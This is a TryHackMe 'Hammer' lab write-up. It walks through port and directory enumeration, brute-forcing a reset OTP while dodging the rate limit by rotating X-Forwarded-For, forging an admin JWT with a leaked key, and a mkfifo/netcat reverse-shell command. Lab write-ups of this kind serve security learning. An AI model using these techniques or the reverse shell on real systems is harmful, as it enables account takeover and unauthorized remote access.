# Hammer — TryHackMe

**Tipe:** Web Application Authentication<br>
**Difficulty:** Medium<br>
**OS:** Linux

---

## Attack Path Overview
```
recon -> web enumeration -> forgot password -> bypass OTP -> JWT manipulation -> reverse shell 
```

---

## 1. Network Reconnaissance

```bash
# Port scan
nmap -sS -p- -T4 -oN hammer.nmap hammer.thm

Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste

```
Port 22 and 1337 are open, because the room context is a web application, so just analyze http on port 1337

## 2. Web Enumeration
Visit web on port 1337 and we will get login page `assets/login_page.png`. Then check the source page.

```html
 <title>Login</title>
    <link href="/hmr_css/bootstrap.min.css" rel="stylesheet">
	<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```
There is an indication that the directory on the web start with `hmr_DIRECTORY_NAME`<br>So from here we can do directory enumeration. 

## 3. Directory Enumeration

Perform enumeration using the place holder hmr_FUZZ
```bash
ffuf -u http://hammer.thm:1337/hmr_FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt

images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 117ms]
logs                    [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 117ms]
js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 2478ms]
css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 4531ms
:: Progress: [62281/62281] :: Job [1/1] :: 368 req/sec :: Duration: [0:03:07] :: Errors: 0 ::

```
The results of the enumeration are the hmr_logs, hmr_images, hmr_css and hmr_js directories.<br>
Visit directory hmr_logs and open error.logs `assets/hmr_logs.png`<br>
```text
# error.logs
[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down
```
### Explanation
User Enumeration: Error differs between Password Mismatch and Invalid email address leaking one of the valid emails which is `tester@hammer.thm`<br>
Brute-Force: Failed login attempts against valid users are visible. This is risky if there is no rate limiting.<br>
Sensitive File Access: There were attempts to access /etc/shadow and /home/hammerthm/test.php<br><br>
Because there is a login page on the web, so the first thing to do is analyze the email in the error logs

## 4. Password Recovery OTP

Go to the forgot password page and enter the email `tester@hammer.thm`<br>Then enter OTP code `assets/otp_page.png`

```http
POST /reset_password.php HTTP/1.1
Host: hammer.thm:1337
Content-Length: 24
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: http://hammer.thm:1337
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://hammer.thm:1337/reset_password.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=<REDACTED>
Connection: keep-alive

recovery_code=1234&s=180
```
There is a rate limit on OTP. Each session can only allow a maximum of 7 attempts, each lasting 180s. `assets/rate_limite.png`


## 5. ByPass OTP

The application trusted the X-Forwarded-For header when identifying clients. by changing its value for each request, the OTP rate-limiting mechanism could be bypassed<br>
```bash
### create a file containing otp code
# generate otp value
crunch 4 4 -o otp.txt -t %%%% -s 0000 -e 9999 
```
### ffuf
```bash
ffuf -w otp.txt:w1 -w otp.txt:w2 -mode pitchfork -X POST -d "recovery_code=w1&s=80" -H "Content-Type: application/x-www-form-urlencoded" \
-H "X-Forwarded-For: w2" -u "http://hammer.thm:1337/reset_password.php" -b "PHPSESSID=g2uij0q1fjjf81jufr6fbj4091" -t 100 -fs 2200 -fs 2291

[Status: 200, Size: 2190, Words: 595, Lines: 53, Duration: 967ms]
    * w1: <REDACTED>
    * w2: <REDACTED>

:: Progress: [10000/10000] :: Job [1/1] :: 121 req/sec :: Duration: [0:01:19] :: Errors: 0 ::
```
Use ffuf with two placeholders for X-Forwarded-For and otp using otp.txt<br>
Ffuf uses a Pitchfork attack type because both placeholders will be tested simultaneously.<br>
Use burp proxy to retrieve session cookies. Use ffuf instead of burp because in this case ffuf is faster than burp suite community `assets/fuzz_otp.png`<br><br>
Receive OTP and reset password

## 6. Discover and Analysis Command Page
`assets/command_page.png`

```http
POST /execute_command.php HTTP/1.1
Host: hammer.thm:1337
Content-Length: 16
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsI....<REDACTED>....signature
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: http://hammer.thm:1337
Referer: http://hammer.thm:1337/dashboard.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=<REDACTED>; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsI....<REDACTED>....signature; persistentSession=no
Connection: keep-alive

{"command":"ls"}
```
This page does not have persistence. So the next step is to forward this request to the repeater using burp suite. On this command page, i am given a JWT token containing the authorization that i have.<br>
I gained access to an authenticated command execution page. The page accepted system commands through a web form and returned their output in the application response.
```http
# After sending the request, i got response
{"output":"188ade1.key\ncomposer.json\nconfig.php\ndashboard.php\nexecute_command.php\nhmr_css\nhmr_images\nhmr_js\nhmr_logs\nindex.php\nlogout.php\nreset_password.php\nvendor\n"}
```

Visit `http://hammer.thm:1337/188ade1.key` and download the file

### Note: only the ls command is allowed, if I try another command the response becomes
```http
# request
{"command":"pwd"}
# response
{"error":"Command not allowed"}
```

After downloading the 188ade1.key file I got `<REDACTED>` which is the key to generate a new JWT

## 7. Generate and Analysis JWT
Authorization on this website uses the header Authorization: Bearer <token>
### Analysis Token
```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsI....<REDACTED>....signature
```
JWT uses the base64 format to encode its tokens. The token consists of `header.payload.signature`.<br> Use cyberchef to decode token.<br><br>
After I analyzed the token whose signature was removed and the algorithm was set to 'None', it could not be used in requests on the web because it had been validated on the server side.<br>
So the way to do it is to use the key i got earlier and use that key to generate a new token. `<REDACTED>`

```python
import jwt

secret_key = "<REDACTED>"

header = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "/var/www/html/188ade1.key"
}

payload = {
    "iss": "http://hammer.thm",
    "aud": "http://hammer.thm",
    "iat": 1788859083,
    "exp": 9999999999,  
    "data": {
        "user_id": 1,
        "email": "tester@hammer.thm",
        "role": "admin"
    }
}

token = jwt.encode(payload, secret_key, algorithm="HS256", headers=header)
print(token)
```
This Python script uses PyJWT to generate a new HS256 token using the exposed signing key. The original token structure is preserved, while the embedded authorization data is modified by setting user_id to 1 and role to admin. The kid header references the key file used by the application, and the resulting token is printed for use in the authorized THM lab.<br><br>
After that, replace the token in the old request with the newly generated token.

## 8. Get Access
### prepare listener with netcat
```bash
nc -lvnp 4444
listening on [any] 4444 ...
```

### In the new request, enter the command
```http
{"command":"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> <PORT> > /tmp/f"}
```
after that i managed to make a reverse shell and get a flag `assets/reverse_shell.png`
